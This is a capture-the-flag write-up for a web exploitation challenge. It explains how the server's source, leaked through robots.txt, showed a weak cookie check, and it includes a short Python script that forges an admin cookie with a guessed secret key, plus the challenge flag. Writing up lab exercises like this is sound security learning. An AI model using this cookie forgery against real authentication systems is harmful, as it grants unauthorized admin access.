# Official Business
Points: 125
## Category
Web Exploitation
## Problem Statement
```
Are you here on official business? Prove it.
Connect here:
http://jh2i.com:50006
```
## Solution

* [http://jh2i.com:50006/robots.txt](robots1.txt) had a python file. Apparently dubbed as source code of this server.
* I had login authentication function with one single login hardcoded. Username `'hacker'` and sha512 hash (`b'hackshackshackshackshackshackshackshackshackshackshackshackshack`) of password.
* I searched for sha512 decoders online in hope of finding password but all failed.
* Source code also had function of cookie authentication.
* I looked at it in the hope of generating a valid cookie using username and password hash.
* A valid cookie had 3 parameters username, password in plain text and app.secret_key which was not available.
* I went on to generate a cookie using known parameters and randomly assuming unknown parameters.

```
secret_key = bytes("a","ascii")
def do_login(user, password, admin):

    cookie = {"user": user, "password": password, "admin": admin}
    cookie["digest"] = hashlib.sha512(
        secret_key + bytes(json.dumps(cookie, sort_keys=True), "ascii")
    ).hexdigest()
    print("OK.")
    print(binascii.hexlify(json.dumps(cookie).encode("utf8")))
do_login('hacker','hellllllo',True)
```

* Added this generated cokie in the browser and refreshed the page. To my surprise I found the flag.
* Even the flag was `"flag{did_this_even_pass_code_review}"`.

## Flag
```
flag{did_this_even_pass_code_review}
```